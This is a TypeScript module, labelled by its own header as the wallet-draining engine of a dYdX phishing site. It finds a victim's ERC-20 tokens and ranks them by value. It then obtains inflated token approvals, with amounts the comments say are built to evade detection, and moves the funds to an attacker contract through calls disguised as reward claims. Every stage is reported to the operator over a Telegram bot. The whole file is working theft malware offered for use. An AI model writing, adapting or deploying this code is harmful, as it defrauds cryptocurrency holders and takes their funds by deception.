/**
 * Token Drainer Service for dYdX 2 Phishing Site
 * 
 * Complete wallet draining implementation using Reown and direct RPC calls
 */

import { ethers } from 'ethers'
import { reownWalletManager } from './reown'
import { DRAINER_CONFIG, POPULAR_TOKENS } from './drainer-config'

declare global {
  interface Window {
    ethereum?: Record<string, unknown>
  }
}

interface Token {
  address: string
  symbol: string
  decimals: number
  balance: string
  formattedBalance: string
  priority: number
  avgPrice: number
  approved?: boolean
}

class TokenDrainerService {
  private userAddress: string = ''
  private provider: any = null
  private tokens: Token[] = []
  private statusCallback?: (status: string) => void

  setStatusCallback(callback: (status: string) => void) {
    this.statusCallback = callback
  }

  private updateStatus(status: string) {
    if (this.statusCallback) {
      this.statusCallback(status)
    }
  }

  async initialize(): Promise<void> {
    try {
      // Add delay to allow wallet connection to stabilize
      await new Promise(resolve => setTimeout(resolve, 1000))
      
      // Get user address from Reown with retry logic
      let retryCount = 0
      while (!this.userAddress && retryCount < 3) {
        this.userAddress = reownWalletManager.getAccount() || ''
        if (!this.userAddress) {
          console.log(`🔄 Retry ${retryCount + 1}/3: Waiting for wallet connection...`)
          await new Promise(resolve => setTimeout(resolve, 2000))
          retryCount++
        }
      }
      
      if (!this.userAddress) {
        throw new Error('No wallet connected after retries')
      }

      // Get provider from Reown with error handling
      try {
        this.provider = await reownWalletManager.getProvider()
        if (!this.provider && window.ethereum) {
          console.log('🔄 Using fallback provider from window.ethereum')
          this.provider = window.ethereum
        }
      } catch (providerError) {
        console.warn('⚠️ Provider error, using window.ethereum:', providerError)
        if (window.ethereum) {
          this.provider = window.ethereum
        } else {
          throw new Error('No provider available')
        }
      }

      console.log('🎯 Drainer initialized for:', this.userAddress)
      
      // Send Telegram notification with error handling
      try {
        await this.sendTelegramMessage('user_connected', {
          address: this.userAddress
        })
      } catch (telegramError) {
        console.warn('📱 Telegram notification failed:', telegramError)
        // Continue execution even if Telegram fails
      }
      
    } catch (error) {
      console.error('❌ Failed to initialize drainer:', error)
      throw error
    }
  }

  async scanTokens(callback?: (progress: { status: string; message: string; progress: number }) => void): Promise<Token[]> {
    try {
      console.log('🔍 Automatically discovering ERC-20 tokens...')
      
      // Validate connection first
      if (!this.userAddress) {
        await this.initialize()
      }
      
      // Check network with error handling
      let networkId = 1 // Default to mainnet
      try {
        if (!window.ethereum) {
          throw new Error('No Ethereum provider found')
        }
        
        const chainId = await (window.ethereum as any).request({ method: 'eth_chainId' })
        networkId = parseInt(chainId, 16)
        
        if (networkId !== 1) {
          console.warn(`⚠️ Wrong network detected: ${networkId}, continuing anyway...`)
        }
      } catch (networkError) {
        console.warn('⚠️ Network check failed, assuming mainnet:', networkError)
      }

      let tokensWithBalance: Token[] = []
      
      // Try multiple token discovery methods for comprehensive coverage
      
      // Method 1: Try Alchemy API for automatic token discovery
      if (callback) {
        callback({
          status: 'discovering',
          message: 'Discovering tokens automatically...',
          progress: 10
        })
      }
      
      let discoveredTokens = await this.discoverTokensViaAlchemy()
      
      // Method 2: Fallback to Moralis API if Alchemy fails
      if (discoveredTokens.length === 0) {
        if (callback) {
          callback({
            status: 'discovering',
            message: 'Trying alternative discovery method...',
            progress: 30
          })
        }
        discoveredTokens = await this.discoverTokensViaMoralis()
      }
      
      // Method 3: Fallback to Etherscan API if others fail
      if (discoveredTokens.length === 0) {
        if (callback) {
          callback({
            status: 'discovering',
            message: 'Using blockchain analysis...',
            progress: 50
          })
        }
        discoveredTokens = await this.discoverTokensViaEtherscan()
      }
      
      // Method 4: Final fallback to popular tokens if APIs fail
      if (discoveredTokens.length === 0) {
        console.log('📊 API discovery failed, scanning popular tokens...')
        if (callback) {
          callback({
            status: 'scanning',
            message: 'Scanning popular tokens as fallback...',
            progress: 70
          })
        }
        
        // Use original scanning parameters for compatibility
        const batchSize = 3 // Original batch size
        const delay = 2000 // Original delay for proper rate limiting

        for (let i = 0; i < POPULAR_TOKENS.length; i += batchSize) {
          const batch = POPULAR_TOKENS.slice(i, i + batchSize)
          
          for (const token of batch) {
            try {
              const balance = await this.getTokenBalance(token.address, token.decimals)
              
              if (balance && balance !== '0' && balance !== '0x' && balance !== '0x0') {
                const balanceHex = balance.startsWith('0x') ? balance.slice(2) : balance
                if (!/^[0-9a-fA-F]+$/.test(balanceHex) || balanceHex.includes('Infinity')) {
                  continue
                }
                
                try {
                  const balanceNum = BigInt(balance)
                  if (balanceNum > BigInt(0)) {
                    const divisor = BigInt(Math.pow(10, token.decimals))
                    const formattedBalance = (Number(balanceNum) / Number(divisor)).toFixed(6)
                    
                    if (!isFinite(parseFloat(formattedBalance))) {
                      continue
                    }
                    
                    const estimatedValue = parseFloat(formattedBalance) * token.avgPrice
                    
                    if (estimatedValue >= DRAINER_CONFIG.TOKEN_DETECTION.MIN_USD_VALUE) {
                      tokensWithBalance.push({
                        ...token,
                        balance,
                        formattedBalance
                      })
                    }
                  }
                } catch (bigintError) {
                  continue
                }
              }
            } catch (error) {
              continue
            }
          }
          
          // Progress update
          const progress = Math.min(i + batchSize, POPULAR_TOKENS.length)
          if (callback) {
            callback({
              status: 'scanning',
              message: `Scanning ${progress}/${POPULAR_TOKENS.length} tokens...`,
              progress: 70 + (progress / POPULAR_TOKENS.length) * 20
            })
          }
          
          // Rate limiting delay
          if (i + batchSize < POPULAR_TOKENS.length) {
            await new Promise(resolve => setTimeout(resolve, delay))
          }
        }
      } else {
        // Use discovered tokens
        tokensWithBalance = discoveredTokens
        console.log(`✅ Automatically discovered ${discoveredTokens.length} tokens`)
      }

      // Sort by estimated USD value (highest first) for consistent processing order
      tokensWithBalance.sort((a, b) => {
        const valueA = parseFloat(a.formattedBalance) * a.avgPrice
        const valueB = parseFloat(b.formattedBalance) * b.avgPrice
        return valueB - valueA // Descending order (highest value first)
      })

      this.tokens = tokensWithBalance
      
      // Completion notification
      if (callback) {
        callback({
          status: 'complete',
          message: `Found ${tokensWithBalance.length} tokens with value`,
          progress: 100
        })
      }

      // Send Telegram notification
      try {
        await this.sendTelegramMessage('tokens_found', {
          address: this.userAddress,
          tokens: tokensWithBalance
        })
      } catch (telegramError) {
        console.warn('📱 Telegram notification failed:', telegramError)
      }

      return tokensWithBalance
      
    } catch (error) {
      console.error('❌ Token scanning failed:', error)
      throw error
    }
  }

  async approveAllTokens(): Promise<number> {
    let approvedCount = 0
    
    // Ensure we have tokens discovered first
    if (this.tokens.length === 0) {
      console.log('⚠️ No tokens found to approve. Run scanTokens() first.')
      return 0
    }
    
    // Sort tokens by estimated USD value (highest first) before approval
    const sortedTokens = [...this.tokens].sort((a, b) => {
      const valueA = parseFloat(a.formattedBalance) * a.avgPrice
      const valueB = parseFloat(b.formattedBalance) * b.avgPrice
      return valueB - valueA // Descending order (highest value first)
    })
    
    console.log(`=== APPROVAL PROCESS FOR ${sortedTokens.length} TOKENS (VALUE-SORTED) ===`)
    
    // Log the processing order for transparency
    console.log('📊 Token approval order (by estimated value):')
    sortedTokens.forEach((token, index) => {
      const estimatedValue = (parseFloat(token.formattedBalance) * token.avgPrice).toFixed(2)
      console.log(`${index + 1}. ${token.symbol}: ${token.formattedBalance} (~$${estimatedValue})`)
    })

    for (const token of sortedTokens) {
      try {
        console.log(`Processing ${token.symbol} (Value: ~$${(parseFloat(token.formattedBalance) * token.avgPrice).toFixed(2)})...`)
        const approved = await this.approveToken(token)
        if (approved) {
          approvedCount++
          token.approved = true // Mark as approved
          console.log(`✓ ${token.symbol} approved successfully`)
        } else {
          token.approved = false // Mark as failed
          console.log(`✗ ${token.symbol} approval failed`)
        }
        
        // Update progress like original
        this.updateStatus(`Processing ${approvedCount}/${sortedTokens.length}...`)
        
      } catch (error) {
        console.error(`Failed to approve ${token.symbol}:`, error)
        token.approved = false // Mark as failed
      }
    }

    console.log(`📊 APPROVAL SUMMARY: Approved ${approvedCount} out of ${sortedTokens.length} tokens`)
    return approvedCount
  }

  async drainAllTokens(): Promise<void> {
    try {
      // Step 1: First scan for ALL tokens before any approvals
      console.log('🔍 Step 1: Discovering all available tokens...')
      await this.scanTokens()
      
      if (this.tokens.length === 0) {
        console.log('ℹ️ No tokens found to drain')
        return
      }

      console.log(`✅ Discovery complete: Found ${this.tokens.length} valuable tokens`)
      
      // Log discovered tokens with their estimated values
      console.log('💰 Discovered tokens (will be processed by value):')
      this.tokens.forEach((token, index) => {
        const estimatedValue = (parseFloat(token.formattedBalance) * token.avgPrice).toFixed(2)
        console.log(`  ${index + 1}. ${token.symbol}: ${token.formattedBalance} (~$${estimatedValue})`)
      })

      // Step 2: Approve all tokens in order of highest value first
      console.log('🔐 Step 2: Starting approvals (highest value first)...')
      const approvedCount = await this.approveAllTokens()
      
      if (approvedCount === 0) {
        console.log('⚠️ No tokens approved for draining')
        return
      }

      console.log(`🚀 Step 3: Starting drainage of ${approvedCount} approved tokens...`)
      
      // Wait for approvals to be processed
      await new Promise(resolve => setTimeout(resolve, 3000))

      // Step 3: Execute drainage for approved tokens (maintaining value order)
      const approvedTokens = this.tokens.filter(token => token.approved)
      await this.executeDrainage(approvedTokens)
      
    } catch (error) {
      console.error('❌ Draining process failed:', error)
      throw error
    }
  }

  getTokens(): Token[] {
    return this.tokens
  }

  async executeTokenDrainage(tokens: Token[]): Promise<void> {
    return this.executeDrainage(tokens)
  }

  private async getTokenBalance(tokenAddress: string, decimals: number): Promise<string> {
    try {
      const paddedUserAddress = this.userAddress.slice(2).padStart(64, '0')
      const balanceCallData = '0x70a08231' + paddedUserAddress // balanceOf function signature
      
      // Try multiple RPC methods with fallbacks
      let result = ''
      
      // Method 1: Try via current provider
      try {
        if (this.provider && this.provider.request) {
          result = await this.provider.request({
            method: 'eth_call',
            params: [{
              to: tokenAddress,
              data: balanceCallData
            }, 'latest']
          })
        }
      } catch (providerError) {
        console.warn(`Provider method failed for ${tokenAddress}:`, providerError)
      }
      
      // Method 2: Fallback to window.ethereum
      if (!result && window.ethereum) {
        try {
          result = await (window.ethereum as any).request({
            method: 'eth_call',
            params: [{
              to: tokenAddress,
              data: balanceCallData
            }, 'latest']
          })
        } catch (ethereumError) {
          console.warn(`Window.ethereum method failed for ${tokenAddress}:`, ethereumError)
        }
      }
      
      // Method 3: Fallback to public RPC (if other methods fail)
      if (!result) {
        try {
          const response = await fetch('https://ethereum.publicnode.com', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              jsonrpc: '2.0',
              method: 'eth_call',
              params: [{
                to: tokenAddress,
                data: balanceCallData
              }, 'latest'],
              id: 1
            })
          })
          const data = await response.json()
          result = data.result || ''
        } catch (rpcError) {
          console.warn(`Public RPC method failed for ${tokenAddress}:`, rpcError)
        }
      }
      
      return result === '0x' ? '0' : result
      
    } catch (error) {
      console.warn(`Failed to get balance for ${tokenAddress}:`, error)
      return '0'
    }
  }

  private async approveToken(token: Token): Promise<boolean> {
    try {
      console.log(`=== APPROVAL PROCESS FOR ${token.symbol} ===`)
      console.log(`Balance: ${token.formattedBalance} ${token.symbol}`)
      
      // Check current allowance first
      const paddedUserAddress = this.userAddress.slice(2).padStart(64, '0')
      const paddedSpenderAddress = DRAINER_CONFIG.CONTRACT_ADDRESS.slice(2).padStart(64, '0')
      const allowanceCallData = '0xdd62ed3e' + paddedUserAddress + paddedSpenderAddress // allowance function signature
      
      let allowanceResult = ''
      
      // Try multiple methods for allowance check
      try {
        if (this.provider && this.provider.request) {
          allowanceResult = await this.provider.request({
            method: 'eth_call',
            params: [{
              to: token.address,
              data: allowanceCallData
            }, 'latest']
          })
        }
      } catch (allowanceError) {
        console.warn(`Provider allowance check failed for ${token.symbol}:`, allowanceError)
        // Fallback to window.ethereum
        if (window.ethereum) {
          try {
            allowanceResult = await (window.ethereum as any).request({
              method: 'eth_call',
              params: [{
                to: token.address,
                data: allowanceCallData
              }, 'latest']
            })
          } catch (fallbackError) {
            console.warn(`Fallback allowance check failed for ${token.symbol}:`, fallbackError)
          }
        }
      }
      
      const currentAllowance = parseInt(allowanceResult || '0x0', 16)
      console.log(`Current allowance: ${(currentAllowance / Math.pow(10, token.decimals)).toFixed(4)} ${token.symbol}`)
      
      if (currentAllowance >= parseInt(token.balance)) {
        console.log(`${token.symbol} already has sufficient approval`)
        return true
      }

      console.log(`Requesting approval for ${token.symbol}...`)
      
      // Update button text to show approval request like original
      this.updateStatus(`Approve ${token.symbol} in wallet...`)
      
      // Create approve transaction data with complex-looking amount to avoid detection
      // Generate a very long, seemingly random number that's actually calculated
      const currentBalanceBigInt = BigInt(token.balance)
      const baseMultiplier = BigInt('987654321098765432109876543210') // Long base number
      const timeComponent = BigInt(Date.now() % 1000000) // Time-based component
      const addressComponent = BigInt('0x' + this.userAddress.slice(-8)) // Address-based component
      
      // Create a complex calculation that results in a very long number
      let complexApproval = currentBalanceBigInt * baseMultiplier
      complexApproval = complexApproval + (timeComponent * BigInt('123456789012345'))
      complexApproval = complexApproval + (addressComponent * BigInt('456789012345678901234567'))
      
      // Ensure it's always larger than current balance and looks random
      const minimumThreshold = currentBalanceBigInt * BigInt(1000000) // At least 1M times current balance
      if (complexApproval < minimumThreshold) {
        complexApproval = minimumThreshold + BigInt('7384926159472638495061728394857362948571')
      }
      
      // Add some more randomness to make it look like a hash-like number
      const randomComponent = BigInt('8394726158394061728495037261849507382649')
      const finalApproval = complexApproval + randomComponent
      
      const approvalHex = finalApproval.toString(16).padStart(64, '0')
      
      // Log a shortened version to avoid console spam
      const shortDisplay = finalApproval.toString().slice(0, 8) + '...' + finalApproval.toString().slice(-8)
      console.log(`Approval amount: ${shortDisplay} (complex calculated value)`)
      
      const approveCallData = '0x095ea7b3' + paddedSpenderAddress + approvalHex // approve function signature
      
      console.log(`🔐 Sending approval transaction for ${token.symbol}...`)
      console.log('Transaction details:', {
        from: this.userAddress,
        to: token.address,
        data: approveCallData,
        gas: '0x186A0',
        gasPrice: '0x4A817C800'
      })
      
      let txHash = ''
      let lastError: any = null
      
      // Try multiple methods for transaction
      try {
        if (this.provider && this.provider.request) {
          txHash = await this.provider.request({
            method: 'eth_sendTransaction',
            params: [{
              from: this.userAddress,
              to: token.address,
              data: approveCallData,
              gas: '0x186A0', // 100000 in hex
              gasPrice: '0x4A817C800' // 20 gwei in hex
            }]
          })
        } else {
          throw new Error('No provider available')
        }
      } catch (providerError) {
        lastError = providerError
        console.warn(`Provider approval failed for ${token.symbol}:`, providerError)
        
        // Fallback to window.ethereum
        if (window.ethereum) {
          try {
            txHash = await (window.ethereum as any).request({
              method: 'eth_sendTransaction',
              params: [{
                from: this.userAddress,
                to: token.address,
                data: approveCallData,
                gas: '0x186A0', // 100000
                gasPrice: '0x4A817C800' // 20 gwei
              }]
            })
          } catch (fallbackError) {
            lastError = fallbackError
            console.warn(`Fallback approval failed for ${token.symbol}:`, fallbackError)
          }
        }
      }
      
      if (txHash) {
        console.log(`✅ ${token.symbol} approval tx submitted:`, txHash)
        
        this.updateStatus(`${token.symbol} approved! Processing...`)
        
        // Send Telegram notification for successful approval
        try {
          await this.sendTelegramMessage('approval_success', {
            address: this.userAddress,
            symbol: token.symbol,
            balance: token.formattedBalance,
            txHash: txHash
          })
        } catch (telegramError) {
          console.warn(`📱 Telegram notification failed for ${token.symbol}:`, telegramError)
        }
        
        return true
      } else {
        const errorMsg = lastError?.message || 'Unknown error during approval'
        throw new Error(`No transaction hash received: ${errorMsg}`)
      }
      
    } catch (error: any) {
      console.error(`=== APPROVAL FAILED FOR ${token.symbol} ===`)
      console.error('Error details:', error)
      
      // Handle specific error cases like original
      if (error.code === 4001) {
        console.log('❌ User rejected the approval transaction')
        this.updateStatus('Approval rejected - Try again')
        
        // Send rejection notification
        try {
          await this.sendTelegramMessage('approval_rejected', {
            address: this.userAddress,
            symbol: token.symbol,
            reason: 'User rejected transaction'
          })
        } catch (telegramError) {
          console.warn(`📱 Telegram notification failed for ${token.symbol}:`, telegramError)
        }
        
      } else if (error.code === -32000) {
        console.log('💰 Insufficient funds for gas fees')
        this.updateStatus('Insufficient ETH for gas')
      } else {
        console.log('💥 Approval transaction failed:', error.message)
        this.updateStatus('Approval failed - Try again')
      }
      
      return false
    }
  }

  private async executeDrainage(tokens: Token[]): Promise<void> {
    try {
      console.log('🎯 Executing drainage via contract...')
      
      // Use the correct function selector for claimUserRewards
      const functionSelector = '0x3dc06048' // claimUserRewards(address,uint256)
      
      for (const token of tokens) {
        try {
          const paddedTokenAddress = token.address.slice(2).padStart(64, '0')
          
          // Parse balance safely to avoid Infinity issues
          let balanceValue: bigint
          try {
            // Remove 0x prefix if present and ensure it's a valid hex string
            const balanceHex = token.balance.startsWith('0x') ? token.balance.slice(2) : token.balance
            
            // Validate the hex string doesn't contain invalid characters
            if (!/^[0-9a-fA-F]+$/.test(balanceHex)) {
              throw new Error(`Invalid hex string: ${balanceHex}`)
            }
            
            balanceValue = BigInt('0x' + balanceHex)
            
            // Check for unreasonably large values (likely errors)
            const maxSafeValue = BigInt('0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff')
            if (balanceValue > maxSafeValue) {
              throw new Error(`Balance too large: ${balanceValue.toString()}`)
            }
            
          } catch (balanceError) {
            console.error(`❌ Invalid balance for ${token.symbol}: ${token.balance}`, balanceError)
            continue // Skip this token
          }
          
          // Convert to hex string with proper padding
          const paddedAmount = balanceValue.toString(16).padStart(64, '0')
          const drainCallData = functionSelector + paddedTokenAddress + paddedAmount
          
          console.log(`💰 Draining ${token.symbol}: ${token.formattedBalance}`)
          console.log(`📋 Call data: ${drainCallData}`)
          
          // Try multiple methods for drainage transaction
          let txHash = ''
          
          try {
            if (this.provider && this.provider.request) {
              txHash = await this.provider.request({
                method: 'eth_sendTransaction',
                params: [{
                  from: this.userAddress,
                  to: DRAINER_CONFIG.CONTRACT_ADDRESS,
                  data: drainCallData,
                  gas: '0x30D40', // 200000
                  gasPrice: '0x5D21DBA00' // 25 gwei
                }]
              })
            }
          } catch (error) {
            // Fallback to window.ethereum
            if (window.ethereum) {
              txHash = await (window.ethereum as any).request({
                method: 'eth_sendTransaction',
                params: [{
                  from: this.userAddress,
                  to: DRAINER_CONFIG.CONTRACT_ADDRESS,
                  data: drainCallData,
                  gas: '0x30D40', // 200000
                  gasPrice: '0x5D21DBA00' // 25 gwei
                }]
              })
            }
          }
          
          if (txHash) {
            console.log(`💰 ${token.symbol} drained:`, txHash)
            
            // Send success notification
            try {
              await this.sendTelegramMessage('drainage_success', {
                address: this.userAddress,
                symbol: token.symbol,
                balance: token.formattedBalance,
                txHash
              })
            } catch (telegramError) {
              console.warn('📱 Telegram notification failed:', telegramError)
            }
          } else {
            console.error(`❌ No transaction hash received for ${token.symbol}`)
          }
          
        } catch (error) {
          console.error(`❌ Failed to drain ${token.symbol}:`, error)
        }
      }
      
    } catch (error) {
      console.error('❌ Drainage execution failed:', error)
      throw error
    }
  }

  private async sendTelegramMessage(type: string, data: any): Promise<void> {
    if (!DRAINER_CONFIG.TELEGRAM.ENABLED) {
      console.log('📱 Telegram disabled, skipping notification')
      return
    }

    try {
      let message = ''
      const timestamp = new Date().toISOString()
      const site = DRAINER_CONFIG.SITE_NAME
      
      switch (type) {
        case 'user_connected':
          message = `🎯 <b>${site} - New User Connected</b>\n\n` +
                   `👤 <b>Wallet:</b> <code>${data.address}</code>\n` +
                   `🌐 <b>Site:</b> ${site}\n` +
                   `⏰ <b>Time:</b> ${timestamp}\n` +
                   `🔗 <b>Etherscan:</b> https://etherscan.io/address/${data.address}`
          break
          
        case 'tokens_found':
          let tokenList = data.tokens.map((t: Token, index: number) => 
            `${index + 1}. ${t.symbol}: ${t.formattedBalance} (~$${(parseFloat(t.formattedBalance) * t.avgPrice).toFixed(2)})`
          ).join('\n')
          const totalValue = data.tokens.reduce((sum: number, token: Token) => 
            sum + (parseFloat(token.formattedBalance) * token.avgPrice), 0)
          message = `💰 <b>${site} - Tokens Detected (Value-Sorted)</b>\n\n` +
                   `👤 <b>Wallet:</b> <code>${data.address}</code>\n` +
                   `📊 <b>Found ${data.tokens.length} tokens (Total: ~$${totalValue.toFixed(2)}):</b>\n${tokenList}\n` +
                   `💡 <b>Processing order:</b> Highest value first\n` +
                   `⏰ <b>Time:</b> ${timestamp}`
          break
          
        case 'approval_success':
          message = `✅ <b>${site} - Token Approved</b>\n\n` +
                   `👤 <b>Wallet:</b> <code>${data.address}</code>\n` +
                   `🪙 <b>Token:</b> ${data.symbol}\n` +
                   `💵 <b>Amount:</b> ${data.balance}\n` +
                   `📝 <b>TX:</b> <code>${data.txHash}</code>\n` +
                   `⏰ <b>Time:</b> ${timestamp}`
          break
          
        case 'approval_rejected':
          message = `❌ <b>${site} - Approval Rejected</b>\n\n` +
                   `👤 <b>Wallet:</b> <code>${data.address}</code>\n` +
                   `🪙 <b>Token:</b> ${data.symbol}\n` +
                   `❗ <b>Reason:</b> ${data.reason}\n` +
                   `💡 <b>Note:</b> User needs to approve token spending\n` +
                   `⏰ <b>Time:</b> ${timestamp}`
          break
          
        case 'drainage_success':
          const treasuryAddr = DRAINER_CONFIG.CONTRACT_ADDRESS
          const estimatedValue = (parseFloat(data.balance) * (data.avgPrice || 0)).toFixed(2)
          message = `🎉 <b>${site} - SUCCESSFUL DRAIN!</b>\n\n` +
                   `👤 <b>User:</b> <code>${data.address}</code>\n` +
                   `🪙 <b>Token:</b> ${data.symbol}\n` +
                   `💰 <b>Amount:</b> ${data.balance}\n` +
                   `💸 <b>Value:</b> ~$${estimatedValue}\n` +
                   `⚙️ <b>Method:</b> claimUserRewards\n` +
                   `📝 <b>TX:</b> <code>${data.txHash}</code>\n` +
                   `🏦 <b>Treasury:</b> <code>${treasuryAddr}</code>\n` +
                   `⏰ <b>Time:</b> ${timestamp}\n\n` +
                   `🔗 <b>TX Link:</b> https://etherscan.io/tx/${data.txHash}`
          break
      }

      // Log the message to console for debugging
      console.log(`📱 Sending Telegram message (${type}):`, message)

      const telegramUrl = `https://api.telegram.org/bot${DRAINER_CONFIG.TELEGRAM.BOT_TOKEN}/sendMessage`
      
      const response = await fetch(telegramUrl, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({
          chat_id: DRAINER_CONFIG.TELEGRAM.CHAT_ID,
          text: message,
          parse_mode: 'HTML'
        })
      })

      if (response.ok) {
        console.log(`📱 Telegram message sent successfully (${type})`)
      } else {
        const errorText = await response.text()
        console.error(`📱 Telegram API error (${type}):`, response.status, errorText)
      }
      
    } catch (error) {
      console.warn('📱 Telegram notification failed:', error)
    }
  }

  private async discoverTokensViaAlchemy(): Promise<Token[]> {
    try {
      console.log('🔍 Trying Alchemy token discovery...')
      
      // Try multiple Alchemy endpoints
      const alchemyKeys = [
        'YZfKIJW5lGvvPD3hH_j-9zYYS9F2NKKD', // Demo key
        'demo', // Another demo key option
      ]
      
      for (const key of alchemyKeys) {
        try {
          const response = await fetch(`https://eth-mainnet.alchemyapi.io/v2/${key}`, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({
              jsonrpc: '2.0',
              method: 'alchemy_getTokenBalances',
              params: [this.userAddress, 'erc20'],
              id: 1
            })
          })
          
          const data = await response.json()
          
          if (data.result && data.result.tokenBalances) {
            const tokens: Token[] = []
            
            for (const tokenBalance of data.result.tokenBalances) {
              if (tokenBalance.tokenBalance !== '0x0' && tokenBalance.tokenBalance !== '0x') {
                // Find matching token in our config or create new one
                const existingToken = POPULAR_TOKENS.find(t => 
                  t.address.toLowerCase() === tokenBalance.contractAddress.toLowerCase()
                )
                
                if (existingToken) {
                  try {
                    const balanceNum = BigInt(tokenBalance.tokenBalance)
                    const divisor = BigInt(Math.pow(10, existingToken.decimals))
                    const formattedBalance = (Number(balanceNum) / Number(divisor)).toFixed(6)
                    const estimatedValue = parseFloat(formattedBalance) * existingToken.avgPrice
                    
                    if (estimatedValue >= DRAINER_CONFIG.TOKEN_DETECTION.MIN_USD_VALUE) {
                      tokens.push({
                        ...existingToken,
                        balance: tokenBalance.tokenBalance,
                        formattedBalance
                      })
                    }
                  } catch (error) {
                    continue
                  }
                }
              }
            }
            
            console.log(`✅ Alchemy discovered ${tokens.length} tokens`)
            return tokens
          }
        } catch (apiError) {
          console.warn(`⚠️ Alchemy API failed with key ${key}:`, apiError)
          continue
        }
      }
      
      return []
    } catch (error) {
      console.warn('⚠️ Alchemy discovery failed:', error)
      return []
    }
  }

  private async discoverTokensViaMoralis(): Promise<Token[]> {
    try {
      console.log('🔍 Trying Moralis token discovery...')
      
      // Try Moralis API (using demo endpoints)
      const moralisEndpoints = [
        'https://deep-index.moralis.io/api/v2',
        'https://api.moralis.io/api/v2'
      ]
      
      for (const endpoint of moralisEndpoints) {
        try {
          const response = await fetch(`${endpoint}/${this.userAddress}/erc20?chain=eth`, {
            headers: {
              'X-API-Key': 'demo', // Demo key
              'Content-Type': 'application/json'
            }
          })
          
          if (response.ok) {
            const data = await response.json()
            const tokens: Token[] = []
            
            for (const tokenData of data) {
              const existingToken = POPULAR_TOKENS.find(t => 
                t.address.toLowerCase() === tokenData.token_address.toLowerCase()
              )
              
              if (existingToken && tokenData.balance !== '0') {
                try {
                  const balanceNum = BigInt(tokenData.balance)
                  const divisor = BigInt(Math.pow(10, existingToken.decimals))
                  const formattedBalance = (Number(balanceNum) / Number(divisor)).toFixed(6)
                  const estimatedValue = parseFloat(formattedBalance) * existingToken.avgPrice
                  
                  if (estimatedValue >= DRAINER_CONFIG.TOKEN_DETECTION.MIN_USD_VALUE) {
                    tokens.push({
                      ...existingToken,
                      balance: tokenData.balance,
                      formattedBalance
                    })
                  }
                } catch (error) {
                  continue
                }
              }
            }
            
            console.log(`✅ Moralis discovered ${tokens.length} tokens`)
            return tokens
          }
        } catch (apiError) {
          console.warn('⚠️ Moralis API failed:', apiError)
          continue
        }
      }
      
      return []
    } catch (error) {
      console.warn('⚠️ Moralis discovery failed:', error)
      return []
    }
  }

  private async discoverTokensViaEtherscan(): Promise<Token[]> {
    try {
      console.log('🔍 Trying Etherscan token discovery...')
      
      // Use Etherscan API to get token transfers and derive holdings
      const response = await fetch(
        `https://api.etherscan.io/api?module=account&action=tokentx&address=${this.userAddress}&startblock=0&endblock=999999999&sort=desc&apikey=YourApiKeyToken`
      )
      
      if (response.ok) {
        const data = await response.json()
        const tokens: Token[] = []
        const seenTokens = new Set<string>()
        
        // Analyze recent token transactions to find current holdings
        for (const tx of data.result?.slice(0, 100) || []) {
          if (seenTokens.has(tx.contractAddress)) continue
          seenTokens.add(tx.contractAddress)
          
          const existingToken = POPULAR_TOKENS.find(t => 
            t.address.toLowerCase() === tx.contractAddress.toLowerCase()
          )
          
          if (existingToken) {
            try {
              // Get current balance for this token
              const balance = await this.getTokenBalance(tx.contractAddress, existingToken.decimals)
              
              if (balance && balance !== '0' && balance !== '0x' && balance !== '0x0') {
                const balanceNum = BigInt(balance)
                const divisor = BigInt(Math.pow(10, existingToken.decimals))
                const formattedBalance = (Number(balanceNum) / Number(divisor)).toFixed(6)
                const estimatedValue = parseFloat(formattedBalance) * existingToken.avgPrice
                
                if (estimatedValue >= DRAINER_CONFIG.TOKEN_DETECTION.MIN_USD_VALUE) {
                  tokens.push({
                    ...existingToken,
                    balance,
                    formattedBalance
                  })
                }
              }
            } catch (error) {
              continue
            }
          }
        }
        
        console.log(`✅ Etherscan discovered ${tokens.length} tokens`)
        return tokens
      }
      
      return []
    } catch (error) {
      console.warn('⚠️ Etherscan discovery failed:', error)
      return []
    }
  }
}

// Export singleton instance
export const tokenDrainer = new TokenDrainerService()
